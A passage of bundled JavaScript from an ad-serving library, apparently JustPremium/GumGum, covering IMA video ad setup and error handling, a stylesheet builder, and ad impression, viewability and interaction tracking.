        }
        return g(t, e), t.prototype._executionFailure = function (e, t, r) {
          var i = f.get(this),
            n = {
              code: 224,
              message: "224",
              stack: "VPAID: method requestAds stuck."
            };
          0 !== Object.keys(i.error).length && i.error.stack && (n.stack = i.error.stack), t.addProperty("error", n), e.destroyPlayer(), e.executionFailure(), this._clearExecution(r), c.default.alwaysLog("info", "Vast exec: Timeout"), e.publish("ended", []), this.publish("executionFailure", [n, t]);
        }, t.prototype._initializeGumGumDependency = function (e, t) {
          e.di.jPlayer = new s.default({
            di: {
              jModel: t.jModel,
              jDOM: t.jDOM,
              jAdFrame: t.jAdFrame,
              jStyle: t.jStyle,
              jTracking: t.jTracking
            },
            sizes: t.sizes,
            options: {
              customControls: !1,
              newControls: {
                bindFullscreenEvent: !0,
                bindHalfscreenEvent: !1
              }
            }
          });
        }, t.prototype._initializeImaDependency = function (e, t) {
          var r = {
            di: {
              jModel: t[0],
              jDOM: t[1],
              jAdFrame: t[2],
              jStyle: t[3],
              jTracking: t[8]
            },
            wrapperElm: t[5],
            containerElm: t[6],
            videoElm: t[4],
            sizes: t[7],
            options: {
              customControls: !1,
              newControls: {
                bindFullscreenEvent: !0,
                bindHalfscreenEvent: !1
              }
            }
          };
          "mv" === e.di.jModel.getFormat() && (r.options.newControls.bindFullscreenEvent = !1, r.options.newControls.bindHalfscreenEvent = !0, r.mediaElm = t[9]), e.di.jPlayer = new a.default(r);
        }, t.prototype._searchForError = function (e, t) {
          var r = function e(t, r) {
            if (t && t.hasOwnProperty(r)) return t[r];
            var i = void 0,
              o = void 0;
            for (o in t) if (t.hasOwnProperty(o) && "object" === n(t[o]) && (i = e(t[o], r))) return i;
            return i;
          }(e, t);
          if (r && ("string" == typeof r || "number" == typeof r)) return r;
        }, t.prototype._setupExecution = function (e) {
          var t = this,
            r = e.di,
            n = f.get(t),
            o = r.jAdFrame.getJDOMElement("ad").getDOMElement(),
            a = r.jModel.getFormat(),
            s = d.default.getSizes(a)[0],
            c = window.document.createElement("div"),
            p = window.document.createElement("div"),
            g = window.document.createElement("video");
          g.id = "jpx-ima-video", g.style.width = "100%", g.style.height = "100%", g.setAttribute("muted", ""), g.setAttribute("playsinline", ""), p.classList.add("jpx-ima-container"), c.classList.add("jpx-ima-wrapper"), c.appendChild(g), c.appendChild(p);
          var m = void 0;
          return "mv" === a ? ((m = window.document.createElement("div")).classList.add("jpx-" + a + "-media", "jpx-ima-media"), m.appendChild(c), o.appendChild(m)) : o.appendChild(c), new Promise(function (o, a) {
            u.default.script("https://imasdk.googleapis.com/js/sdkloader/ima3.js", {}).ready().then(function () {
              var a = [r.jModel, r.jDOM, r.jAdFrame, r.jStyle, g, c, p, s, r.jTracking];
              "mv" === r.jModel.getFormat() && a.push(m), t._initializeImaDependency(e, a), e.di.jPlayer.subscribe("onRequestAds", function (o) {
                var a = i(o, 1)[0];
                n.timeout = l.default.delay(t, function () {
                  t._executionFailure(a, r.jModel, e);
                }, 8e3);
              }), e.di.jPlayer.subscribe("playerLoaded", function () {
                t.publish("asyncWriteAdFound", [t, r.jModel]), o();
              }), e.di.jPlayer.subscribe("adImpression", function (e) {
                e[1] && r.jModel.addProperty("videoFramework", e[1]), t.publish("asyncWriteAdShown", [t, r.jModel]);
              }), e.di.jPlayer.subscribe("adLoaded", function () {
                n.timeout();
              }), e.di.jPlayer.subscribe("playerError", function (i) {
                var o = i[0];
                if (o && "string" != typeof o) {
                  if (o.error) n.error.stack = o.error;else if ("function" == typeof o.getError) {
                    var a = o.getError(),
                      s = void 0,
                      u = void 0,
                      c = void 0,
                      d = void 0;
                    if (!a) return;
                    if (a.g ? s = a.g : a.h && (s = a.h), s && (d = t._searchForError(s, "errorMessage"))) {
                      n.error.stack = d;
                      var l = s.innerError;
                      l && (n.error.stack = n.error.stack + " | innerError: " + JSON.stringify(l)), (c = t._searchForError(s, "type")) && (n.error.stack = n.error.stack + " | " + c), (u = t._searchForError(s, "errorCode")) && (n.error.stack = n.error.stack + " (" + u + ")");
                    }
                    var p = t._searchForError(a, "message");
                    p && (n.error.stack = n.error.stack + " | Message: " + JSON.stringify(p));
                    var g = t._searchForError(a, "stack");
                    g && (n.error.stack = n.error.stack + " | IMA error at: " + JSON.stringify(g));
                  }
                  0 === Object.keys(n.error).length && (n.error.stack = "Unknown Vast player error");
                } else n.error.stack = "VPAID" === o ? "VPAID was block" : "Unknown Vast player error: " + i;
                n.timeout(), t._executionFailure(e.di.jPlayer, r.jModel, e);
              }), e.di.jPlayer.init();
            });
          });
        }, t;
      }(o.default);
    t.default = m;
  },
  55: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = l(r(4)),
      n = l(r(106)),
      o = l(r(562)),
      a = l(r(563)),
      s = l(r(564)),
      u = l(r(566)),
      c = l(r(16)),
      d = l(r(1));
    l(r(18)), l(r(209));
    function l(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function p(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    d.default.getTopScope();
    var g = new WeakMap(),
      f = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            n = i,
            o = {},
            a = (r = r || {}).di || {};
          return g.set(n, o), o.di = a, i;
        }
        return p(t, e), t.prototype._executionFail = function (e, t) {
          var r = t.di.jModel;
          switch (e.code) {
            case 299:
              throw c.default.warn("JExecution: Reroute to other product."), e;
            default:
              throw c.default.error("JExecution: Initialization failed."), this.publish("execError", [e, r]), e;
          }
        }, t.prototype._setupExecution = function (e) {
          return e;
        }, t.prototype._prepareModel = function (e) {
          var t = e.di,
            r = t.jModel;
          return c.default.info("JExecution: after ad frame write"), this.publish("afterFrameWrite", [this, t.jAdFrame, r]), c.default.info("JExecution: before model load"), r.load().catch(function (e) {}), r.ready();
        }, t.prototype._runProduct = function (e) {
          var t = this,
            r = e.di,
            i = g.get(t).di.window,
            n = g.get(t).di.localWindow,
            o = r.constructor,
            a = r.jModel;
          t.publish("adFrameReady", [t, r.jAdFrame, a, i, window]), c.default.info("JExecution: after model loaded.");
          var s = o.factory({
            di: e.di
          });
          n && n.addEventListener("unload", function () {
            t.removeAd(e);
          }), s.subscribe("productError", function (i) {
            t._clearExecution(e), t.publish("executionFailure", [i[0], r.jModel]);
          }), e.di.jProduct = s, e.di.jCompatibilityAdapter.setDependency("jProduct", s), e.di.jProductApi.setDependency("jProduct", s), t.publish("afterProductInit", [t, s, a, i, window]), c.default.info("JExecution: Initializing product with id " + s.getId() + " class."), t.publish("beforeProductSetup", [t, s, a, i, window]), t.publish("beforeProductSetupDeprecated", [t, s, a, i, window]), s.setup(), t.publish("afterProductCreate", [t, s, a, i, window]), s.render(), t.publish("afterProductRender", [t, s, a, i, window]), s.appendTo(i.document.body), t.publish("afterProductAppend", [t, s, a, i.document.body, window]), s.subscribe("afterDestroy", function () {
            c.default.info("JExecution: Ad:" + s.getId() + " closed."), t.publish("afterProductDestroy", [t, a]), delete r.jProduct;
          }), s.show(), c.default.alwaysLog("info", "JExecution: Ad:" + a.getFormat() + "[" + a.getData("ssp") + ":" + a.getData("sourceId") + "] shown."), t.publish("afterProductShow", [t, s, a]);
        }, t.prototype._execute = function (e) {
          var t = this,
            r = e.di,
            i = r.jAdFrame,
            n = r.jModel,
            o = g.get(t).di.window;
          return t.publish("beforeInit", [t, i, n, o, window]), t.publish("beforeFrameWrite", [t, n, i]), 22 === n.getData("ssp") && !0 === n.getData("regular") && n.getData().data && n.getData().data.res_id && (u.default.checkSupport() && u.default.deleteById(n.getData().data.res_id), n.getData().data.source && "cache" === n.getData().data.source && t.publish("servedFromCache", [t, n])), t.broadcast(i, "extendExecutionDetected"), i.render().ready().then(function () {
            return t._setupExecution(e);
          }).then(function () {
            return t._prepareModel(e);
          }).then(function () {
            return t._runProduct(e);
          }).catch(function (r) {
            t._clearExecution(e), t._executionFail(r, e), t.destroy();
          });
        }, t.prototype.removeAd = function (e) {
          var t = g.get(this),
            r = e.di;
          try {
            t.di.jProduct ? t.di.jProduct.destroy() : r.jProduct && r.jProduct.destroy();
          } catch (e) {
            console.log(e);
          }
          r.jTracking && r.jTracking.stopTracking && r.jTracking.stopTracking(), r.jViewabilityTracking && r.jViewabilityTracking.stopTracking && r.jViewabilityTracking.stopTracking();
        }, t.prototype._clearExecution = function (e) {
          e.di.jProduct ? e.di.jProduct.destroy() : e.di.jAdFrame.destroy();
        }, t.prototype._initializeDependency = function (e) {
          var t = this,
            r = g.get(t).di,
            i = r.window,
            u = r.Jpx[function (e) {
              return e.charAt(0).toUpperCase() + e.slice(1);
            }(e.format)],
            c = new n.default({
              di: {
                window: i
              }
            }),
            d = o.default.factory({
              di: {
                jDOM: c,
                window: i
              }
            }),
            l = u.getModel(e),
            p = void 0;
          p = a.default.factory({
            di: {
              jExecution: t,
              jModel: l,
              jDOM: c,
              global: e.global,
              config: e.model,
              localWindow: r.localWindow,
              window: i
            }
          });
          var f = void 0;
          e.global.server && (e.global.server.tiv || e.global.server.debug) && (f = s.default.factory({
            di: {
              jExecution: t,
              jModel: l,
              jDOM: c,
              global: e.global,
              config: e.model,
              localWindow: r.localWindow,
              window: i
            }
          }));
          var m = u.getProductApi({
              di: {
                jExecution: t,
                jModel: l,
                jDOM: c,
                jStyle: d,
                jTracking: p,
                jViewabilityTracking: f,
                localWindow: r.localWindow,
                window: i
              }
            }),
            h = u.getCompatibilityAdapter({
              di: {
                jExecution: t,
                jModel: l,
                jStyle: d,
                jDOM: c
              },
              options: e
            }),
            y = {
              di: {
                window: i
              }
            };
          l.getData("prerendered") && (y.elId = l.getData("prerendered"));
          var v = {
              di: {
                window: i,
                localWindow: r.localWindow,
                jCompatibilityAdapter: h,
                jModel: l,
                jProductApi: m,
                jDOM: new n.default(y),
                global: e.global || {}
              },
              parent: i.document.body
            },
            b = u.getAdFrame(v);
          return h.setDependency("jAdFrame", b), h.setDependency("jProductApi", m), t._prepareFrameTracking({
            di: {
              jAdFrame: b,
              jModel: l,
              jProductApi: m
            }
          }), {
            jCompatibilityAdapter: h,
            jAdFrame: b,
            jDOM: c,
            jTracking: p,
            jViewabilityTracking: f,
            jModel: l,
            jStyle: d,
            jProductApi: m,
            constructor: u
          };
        }, t.prototype.run = function (e) {
          var t = this,
            r = void 0,
            i = void 0;
          r = t._initializeDependency(e), t.publish("dependenciesReady", [r.jModel, r.jProductApi]), i = r.jCompatibilityAdapter;
          var n = e.product.inits || {};
          return i.sandbox(n.product || ""), n && (n.site && (i.sandbox(n.site), n.siteKey = n.siteKey || "unknow", r.jModel.addProperty("executedSiteInit", n.siteKey), n.siteKey = n.siteKey || "", t.publish("siteInitRunning", [t, r.jAdFrame, e.model, n.siteKey])), n.ad && i.sandbox(n.ad), n.settings && r.jModel.addProperty("executedSiteInitSettings", n.settings), void 0 !== n.cls && r.jModel.addProperty("clsCompliance", n.cls)), c.default.info("JExecution: before ad frame write"), t._execute({
            di: r,
            global: e.global
          });
        }, t.prototype._prepareFrameTracking = function (e) {
          var t = this;
          e.di.jAdFrame.subscribe("runAdInFrame", function () {
            t.publish("runAdInFrame", [t, e.di.jAdFrame, e.di.jModel]);
          }), e.di.jProductApi.subscribe("apiExecError", function (e) {
            t.publish("apiExecError", [e[0], e[1]]);
          });
        }, t;
      }(i.default);
    t.default = f;
  },
  562: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = arguments[t];
          for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (e[i] = r[i]);
        }
        return e;
      },
      n = a(r(4)),
      o = a(r(2));
    a(r(1));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function s(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    var u = new WeakMap(),
      c = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            n = i,
            o = {};
          return u.set(n, o), o.di = r.di, n._createStyleElement(), o._rules = [], i;
        }
        return s(t, e), t.prototype._createStyleElement = function () {
          u.get(this).di.jDOM.createElement("style", {
            parent: "@head",
            tag: "style",
            attributes: {
              type: "text/css",
              class: "jpx-element-styles"
            }
          });
        }, t.prototype._getCSSForArray = function (e) {
          for (var t = this, r = void 0, i = "", n = function () {
              var e = (r = t._getRule(r)).properties;
              i += r.selector + "{", Object.keys(e).forEach(function (t) {
                i += t + ":" + e[t] + ";";
              }), i += "}";
            }; r = e.shift();) n();
          return i;
        }, t.prototype._getCSSForSingle = function (e) {
          var t = this._getRule(e),
            r = t.properties,
            i = "";
          return i += t.selector + "{", Object.keys(r).forEach(function (e) {
            i += e + ":" + r[e] + ";";
          }), i += "}";
        }, t.prototype._getCSSForAll = function () {
          for (var e = this, t = u.get(e)._rules.slice(), r = void 0, i = "", n = function () {
              var t = (r = e._getRule(r.name)).properties;
              if (r.abstract) return "continue";
              i += r.selector + "{", Object.keys(t).forEach(function (e) {
                i += e + ":" + t[e] + ";";
              }), i += "}";
            }; r = t.shift();) n();
          return i;
        }, t.prototype._getParentFullPath = function (e) {
          var t = u.get(this)._rules.find(function (t) {
            return t.name === e;
          });
          if (!t.parent) return [t.selector];
          var r = this._getParentFullPath(t.parent);
          return r.push(t.selector), r;
        }, t.prototype._getRule = function (e) {
          var t = this,
            r = u.get(t)._rules.find(function (t) {
              return t.name === e;
            }),
            i = "";
          if (!r) throw t.error(202, {
            name: e
          });
          var n = [];
          if (r.parent && (n = t._getParentFullPath(r.parent)), r.inherits && r.extends) throw t.error(201, {
            class: "JHelperStyleSheetBuilder",
            name: r.name
          });
          if (r.joinWith) if (Array.isArray(r.joinWith)) for (var o = void 0; o = r.joinWith.shift();) i += (o = t._getRule(o)).selector;else i += t._getRule(r.joinWith).selector;
          var a = t._walkToRoot(r);
          return n.push(a.selector), {
            selector: i + n.join(" "),
            properties: a.properties
          };
        }, t.prototype._registerRedraw = function (e) {
          var t = this;
          o.default.delay(t, function () {
            t._needsRedraw = !1, t.apply(e);
          }, 0);
        }, t.prototype._walkToRoot = function (e) {
          var t = u.get(this),
            r = void 0;
          if (e.inherits && e.extends) throw this.error(201, {
            class: "JHelperStyleSheetBuilder",
            name: e.name
          });
          if (!e.inherits && !e.extends) return {
            selector: e.selector,
            properties: e.properties
          };
          e.inherits ? r = t._rules.find(function (t) {
            return t.name === e.inherits;
          }) : e.extends && (r = t._rules.find(function (t) {
            return t.name === e.extends;
          }));
          var n = this._walkToRoot(r),
            o = {
              name: "",
              properties: {}
            };
          return i(o.properties, n.properties), i(o.properties, e.properties), e.inherits ? o.selector = e.selector : e.extends && (o.selector = n.selector + "__" + e.selector), o;
        }, t.prototype.addRule = function (e, t) {
          var r = u.get(this)._rules,
            i = r.findIndex(function (t) {
              return t.name === e;
            });
          return i > -1 && r.splice(i, 1), t.name = e, r.push(t), this;
        }, t.prototype.apply = function (e) {
          var t = this,
            r = u.get(t).di.jDOM,
            i = function () {
              r.getElement("style").getDOMElement().innerText = t.getCSS(e);
            };
          if (!r.isRendered()) {
            var n = r.subscribe("afterRender", function () {
              n(), i();
            });
            return t;
          }
          return i(), t;
        }, t.prototype.getCSS = function (e) {
          return Array.isArray(e) ? this._getCSSForArray(e) : void 0 === e ? this._getCSSForAll() : this._getCSSForSingle(e);
        }, t.prototype.removeRule = function (e) {
          var t = u.get(this),
            r = t._rules.findIndex(function (t) {
              return t.name === e;
            });
          return r > -1 && t._rules.splice(r, 1), this;
        }, t.prototype.setRuleProperty = function (e, t, r) {
          var i = this,
            n = u.get(i),
            o = n.di.jDOM,
            a = n._rules.find(function (t) {
              return t.name === e;
            });
          if (!a) throw i.error(202, {
            name: e
          });
          return r ? a.properties[t] = r : delete a.properties[t], o.isRendered() && (i._needsRedraw || (i._needsRedraw = !0, i._registerRedraw())), i;
        }, t.prototype.setRulePropertyArray = function (e) {
          var t = this;
          return e.forEach(function (e) {
            t.setRuleProperty(e[0], e[1], e[2]);
          }), t;
        }, t.factory = function (e) {
          return new t(e);
        }, t;
      }(n.default);
    t.default = c;
  },
  563: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = c(r(33)),
      n = c(r(85)),
      o = c(r(4)),
      a = c(r(2)),
      s = c(r(1)),
      u = c(r(46));
    function c(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function d(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    var l = s.default.getTopScope(),
      p = new WeakMap(),
      g = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            n = i,
            o = {};
          return p.set(n, o), o.di = r.di, o.settings = {
            start: Date.now(),
            firstTrack: !0,
            interval: [667, 1334, 2668, 5336],
            intervalLevel: 0,
            key: "",
            cover: "",
            source: "",
            scope: "",
            endOfTrack: !1,
            startView: 0,
            inViewTime: 0,
            alwaysInView: !1,
            visibleOnBlur: !1,
            checkInView: !0
          }, o.interaction = {
            number: 0,
            close: 0,
            times: {
              total: 0
            },
            lastInteractionTime: {
              left: 0,
              right: 0,
              center: 0,
              top: 0
            }
          }, o.pauseTracking = !1, n.setKey(), n.setSource(), n.bindEvents(), i;
        }
        return d(t, e), t.prototype._bindScrollEvent = function () {
          var e = p.get(this),
            t = s.default.getTopScope(),
            r = function () {
              e.settings.checkInView = !0, i();
            },
            i = function () {
              t.removeEventListener("scroll", r);
            };
          t.addEventListener("scroll", r);
        }, t.prototype._returnGumGumTrackingType = function (e) {
          switch (e) {
            case "CLICK":
              return "clickUrl";
            case "STARTED":
              return "videoAutoplayPlayUrl";
            case "FIRST_QUARTILE":
              return "videoAutoplayCompleted25Url";
            case "MIDPOINT":
              return "videoAutoplayCompleted50Url";
            case "THIRD_QUARTILE":
              return "videoAutoplayCompleted75Url";
            case "COMPLETE":
              return "videoAutoplayCompleted100Url";
          }
          return !1;
        }, t.prototype.apiTracking = function (e) {
          var t = p.get(this),
            r = t.di,
            o = r.jModel,
            a = r.config,
            s = o.getData("width"),
            u = o.getData("height"),
            c = o.getData("integration") || "st",
            d = t.settings.key,
            l = void 0,
            g = void 0,
            f = void 0;
          switch (c) {
            case "st":
              g = "adserver", f = "err";
              break;
            case "hb":
              g = "bidder", f = "berr";
              break;
            case "extend":
              g = "extend", f = "eerr";
              break;
            case "gumgum":
              g = "gumgum", f = "gerr";
          }
          (l = n.default.factory(g, f, r.global, t.settings.model)).set("cid", d), l.set("zoneId", a.zoneId), l.set("adId", a.adId), l.set("ssp", a.ssp), l.set("dealId", a.dealId ? a.dealId : ""), l.set("format", a.format), l.set("placementId", a.adunitid), l.set("sourceId", a.sourceId), l.set("creativeWidth", s), l.set("creativeHeight", u), l.set("errorCode", "The expand has been blocked."), l.setJsonParams(e), i.default.instance().trackRaw(l);
        }, t.prototype.bindEvents = function () {
          var e = this,
            t = p.get(e),
            r = t.di.jDOM.getScope();
          t.settings.checkInView = r.window.document.hasFocus(), t.di.config && "pa" === t.di.config.format && !t.settings.checkInView && e._bindScrollEvent(), l.addEventListener("beforeunload", function (t) {
            try {
              e.sendTracking();
            } catch (e) {}
          }), r.addEventListener("focus", function () {
            t.settings.checkInView = !0, (t.settings.alwaysInView || t.settings.visibleOnBlur) && e.inView(!0);
          }), r.addEventListener("blur", function () {
            t.settings.checkInView = !1, t.settings.startView = 0, t.settings.inViewInterval && t.settings.inViewInterval();
          });
        }, t.prototype.checkRegisteredAt = function (e) {
          var t = p.get(this).di,
            r = Date.now();
          if (t.global && t.global.server && t.global.server.registeredAt) {
            var i = r - t.global.server.registeredAt;
            return (i = i / 1e3 / 60) < e;
          }
          return !1;
        }, t.prototype.geo = function () {
          var e = p.get(this);
          if (e.di.global && e.di.global.geo) return e.di.global.geo;
        }, t.prototype.getQueryVariable = function (e) {
          for (var t = l.location.search.substring(1).split("&"), r = 0; r < t.length; r++) {
            var i = t[r].split("=");
            if (i[0] == e) return i[1];
          }
          return !1;
        }, t.prototype.init = function (e, t) {
          var r = this,
            i = p.get(r),
            n = 5e3;
          i.settings.firstTrack && (i.settings.start = Date.now(), i.settings.firstTrack = !1, t && (i.settings.startView = Date.now())), i.settings.endOfTrack || (!0 === t && (i.settings.alwaysInView = !0, r.inView(!0)), null !== e && (i.settings.cover = parseFloat(e)), n = i.settings.intervalLevel < 3 ? i.settings.interval[0] : i.settings.intervalLevel >= 3 && i.settings.intervalLevel < 6 ? i.settings.interval[1] : i.settings.intervalLevel >= 6 && i.settings.intervalLevel < 9 ? i.settings.interval[2] : i.settings.interval[3], i.settings.intervalLevel++, i.settings.trackingInterval = a.default.delay(r, function () {
            r.sendTracking(), r.init(i.settings.cover, i.settings.alwaysInView);
          }, n));
        }, t.prototype.initCustomTracking = function (e, t) {
          var r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
            i = this,
            n = p.get(i);
          "string" == typeof t && ["EXPAND", "COLLAPSE", "CLOSE_EXPAND", "CLOSE_COLLAPSE", "CLOSE"].includes(t) && (r = !0), r ? i.sendCustomTracking(e, t, !0) : e && (e.type || "click" === e) && ("scroll" !== e.type || n.pauseTracking ? "scroll" !== e.type && i.sendCustomTracking(e, t) : (n.pauseTracking = !0, i.sendCustomTracking(e, t), a.default.delay(i, function () {
            n.pauseTracking = !1;
          }, 250)));
        }, t.prototype.inView = function (e) {
          var t = this,
            r = p.get(t);
          e && r.settings.checkInView ? (r.settings.startView > 0 && (r.settings.inViewTime += Date.now() - r.settings.startView, r.settings.startView = 0), r.settings.startView = Date.now(), r.settings.visibleOnBlur = !0, r.settings.inViewInterval = a.default.delay(t, function () {
            r.settings.inViewInterval(), t.inView(!0);
          }, 500)) : (r.settings.startView = 0, r.settings.visibleOnBlur = !1, r.settings.inViewInterval && r.settings.inViewInterval());
        }, t.prototype.loadGumGumPixel = function (e) {
          i.default.instance().loadGumGumPixel(e);
        }, t.prototype.sendTracking = function () {
          var e = p.get(this),
            t = e.di,
            r = t.jModel;
          t.config, r.getData("width"), r.getData("height"), r.getData("isAdv"), Date.now(), e.settings.start, e.settings.inViewTime, e.interaction.times, e.interaction.close, e.settings.key, e.settings.source, e.settings.cover;
          return !1;
        }, t.prototype.sendCustomTracking = function (e, t) {
          var r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
            o = p.get(this),
            a = o.di,
            s = a.jModel,
            u = a.config,
            c = s.getData("isAdv"),
            d = s.getData("height"),
            l = s.getData("width"),
            g = o.settings.key,
            f = "cu",
            m = void 0,
            h = void 0;
          r ? h = {
            action: e || ""
          } : "click" === e ? (f = "cl", h = {
            element: t || ""
          }) : h = {
            type: e.type,
            timeStamp: e.timeStamp,
            action: t || "",
            isAdv: c || 0
          }, (m = n.default.factory("adserver", f, a.global, o.settings.model)).set("cid", g), m.set("zoneId", u.zoneId), m.set("adId", u.adId), m.set("ssp", u.ssp), m.set("dealId", u.dealId ? u.dealId : ""), m.set("format", u.format), m.set("placementId", u.adunitid), m.set("sourceId", u.sourceId), m.set("creativeWidth", l), m.set("creativeHeight", d), r && ("EXPAND" === t ? m.set("message", "EXPAND") : "COLLAPSE" === t ? m.set("message", "COLLAPSE") : "CLOSE_EXPAND" === t ? m.set("message", "CLOSE_EXPAND") : "CLOSE_COLLAPSE" === t ? m.set("message", "CLOSE_COLLAPSE") : "close" === t && m.set("message", "close")), c && (s.getData("trackerId") ? h.trackerId = s.getData("trackerId") : h.pubIO = s.getData("pubIO") || 0), s.getData("campaignId") && (h.ca_id = s.getData("campaignId")), s.getData("creativeId") && (h.cr_id = s.getData("creativeId")), s.getData("exchangeId") && (h.ex_id = s.getData("exchangeId")), s.getData("insertionOrderId") && (h.io_id = s.getData("insertionOrderId")), s.getData("dealId") && (h.d_id = s.getData("dealId")), s.getData("publisherId") && (h.p_id = s.getData("publisherId")), s.getData("sourceUrl") && (h.s_url = s.getData("sourceUrl")), s.getData("userDefined") && (h.udp = s.getData("userDefined")), m.setJsonParams(h), i.default.instance().trackRaw(m);
        }, t.prototype.setAdCover = function (e) {
          p.get(this).settings.cover = parseFloat(e);
        }, t.prototype.setKey = function () {
          var e = p.get(this),
            t = e.di.jModel;
          e.settings.key = u.default.getCreativeId(t.getData("creative").html);
        }, t.prototype.setSource = function () {
          var e = p.get(this),
            t = e.di.jModel.getData("creative").html,
            r = t.match(/justpremium.s3.amazonaws.com/),
            i = t.match(/d2nvliyzbo36lk.cloudfront.net/),
            n = t.match(/cdn.justpremium.com/);
          null !== r ? e.settings.source = "s3" : null !== i ? e.settings.source = "cloudfront" : null !== n && (e.settings.source = "cdn");
        }, t.prototype.startInteraction = function (e) {
          var t = p.get(this);
          t.interaction.number++, t.interaction.lastInteractionTime[e] = Date.now(), t.settings.trackingInterval();
        }, t.prototype.stopInteraction = function (e) {
          var t = p.get(this);
          t.interaction.times[e] || (t.interaction.times[e] = [], t.interaction.times[e + "_t"] = 0), t.interaction.lastInteractionTime[e] > 0 && (t.interaction.times[e].push(Date.now() - t.interaction.lastInteractionTime[e]), t.interaction.times[e + "_t"] += Date.now() - t.interaction.lastInteractionTime[e], t.interaction.times.total += Date.now() - t.interaction.lastInteractionTime[e], t.interaction.lastInteractionTime[e] = 0), this.sendTracking(), this.init(t.settings.cover, t.settings.alwaysInView);
        }, t.prototype.stopTracking = function () {
          var e = p.get(this),
            t = !0,
            r = !1,
            i = void 0;
          try {
            for (var n, o = Object.keys(e.interaction.lastInteractionTime)[Symbol.iterator](); !(t = (n = o.next()).done); t = !0) {
              var a = n.value;
              e.interaction.lastInteractionTime[a] > 0 && this.stopInteraction(a);
            }
          } catch (e) {
            r = !0, i = e;
          } finally {
            try {
              !t && o.return && o.return();
            } finally {
              if (r) throw i;
            }
          }
          e.settings.checkInView = !1, e.interaction.close++, e.settings.trackingInterval && e.settings.trackingInterval(), e.settings.endOfTrack = !0, this.sendTracking();
        }, t.prototype.videoTracking = function (e) {
          var t = p.get(this),
            r = t.di,
            o = r.jModel,
            a = r.config,
            s = o.getData("width"),
            u = o.getData("height"),
            c = t.settings.key,
            d = a.format,
            g = a.zoneId,
            f = n.default.factory("adserver", "vi", r.global, t.settings.model);
          f.set("cid", c), f.set("zoneId", g), f.set("adId", a.adId), f.set("ssp", a.ssp), f.set("dealId", a.dealId ? a.dealId : ""), f.set("format", d), f.set("placementId", a.adunitid), f.set("sourceId", a.sourceId), f.set("creativeWidth", s), f.set("creativeHeight", u);
          var m = e[0].action.type;
          f.set("message", m), e[0].player.name = "justpremium", e[0].creative.product = d, e[0].creative.type = m || "video-only", e[0].creative.id = c, e[0].site.domain = l.location.host, e[0].site.tagid = g ? g.toString() : "", e[0].site.integration = o.getData("integration") || "st", f.setJsonParams(e[0]), i.default.instance().trackRaw(f), i.default.instance().loadGumGumPixel(this._returnGumGumTrackingType(m));
        }, t.factory = function (e) {
          return new t(e);
        }, t;
      }(o.default);
    t.default = g;
  },
  564: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = c(r(33)),
      n = c(r(565)),
      o = c(r(4)),
      a = c(r(2)),
      s = c(r(1)),
      u = c(r(46));
    function c(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function d(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
